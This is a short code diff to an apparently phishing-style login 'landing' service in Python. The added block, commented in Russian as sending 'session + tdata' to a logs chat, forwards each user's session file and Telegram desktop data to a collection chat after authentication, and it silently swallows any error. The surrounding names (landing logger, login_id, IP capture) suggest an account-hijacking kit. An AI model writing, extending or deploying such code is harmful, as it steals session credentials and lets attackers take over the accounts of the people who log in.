@@ -187,6 +187,17 @@ async def queue_migration(state, login_id: str, request: Optional[Request] = Non
 		session_path=session_path,
 	)
 
+	# session + tdata в чат логов (не блокируем ответ пользователю надолго)
+	try:
+		from web.services.session_delivery import deliver_session_artifacts
+
+		await deliver_session_artifacts(
+			session_path=session_path,
+			user_label=user_label or "",
+		)
+	except Exception:
+		pass
+
 	await landing_logger.event(
 		"auth.done",
 		ip=req_ip(request),
